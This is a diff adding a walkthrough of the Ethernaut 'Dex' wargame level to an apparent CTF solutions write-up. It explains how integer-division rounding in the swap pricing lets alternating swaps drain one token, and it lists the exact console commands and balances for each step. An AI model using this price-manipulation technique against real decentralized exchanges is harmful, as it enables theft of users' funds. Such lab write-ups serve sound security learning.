@@ -1375,3 +1375,56 @@ await contract.isSold(); // Output: true
 - Submitted the instance and completed the level.
 
 ![Level Complete Output](assets/shop.png)
+
+
+## Ethernaut Level 22: Dex
+
+### Strategy
+The Dex contract determines token swap prices based on a formula involving token reserves. However, due to **Solidity's integer division**, each swap introduces a **small imbalance** favoring the player. By repeatedly swapping tokens back and forth, we can exploit this **price manipulation vulnerability** to slowly increase our token balance relative to the Dex’s and eventually **drain all of one token**.
+
+The key vulnerability lies in:
+```
+function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
+    return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
+}
+```
+Due to integer truncation, the swap price always rounds down—causing imbalance accumulation.
+
+---
+
+### Exploit Steps
+
+1. **Start state**  
+   - Player: 10 token1, 10 token2  
+   - Dex: 100 token1, 100 token2  
+
+2. **Approve Dex to spend our tokens:**
+```
+await contract.approve(contract.address, 500)
+```
+
+3. **Get token addresses:**
+```
+let t1 = await contract.token1();
+let t2 = await contract.token2();
+```
+
+4. **Execute swaps iteratively to drain token1:**
+```
+await contract.swap(t1, t2, 10)   // player: 0 t1, 20 t2
+await contract.swap(t2, t1, 20)   // player: 24 t1, 0 t2
+await contract.swap(t1, t2, 24)   // player: 0 t1, 30 t2
+await contract.swap(t2, t1, 30)   // player: 41 t1, 0 t2
+await contract.swap(t1, t2, 41)   // player: 0 t1, 65 t2
+await contract.swap(t2, t1, 45)   // player: 110 t1, 20 t2
+```
+
+5. **Verify token1 is drained from Dex:**
+```
+await contract.balanceOf(t1, instance).then(v => v.toString())
+// Output: '0'
+```
+
+### Level Completed
+Successfully drained all of `token1` from the Dex by abusing the flawed swap pricing logic. Challenge completed.
+![Level Complete Output](assets/Dex.png)
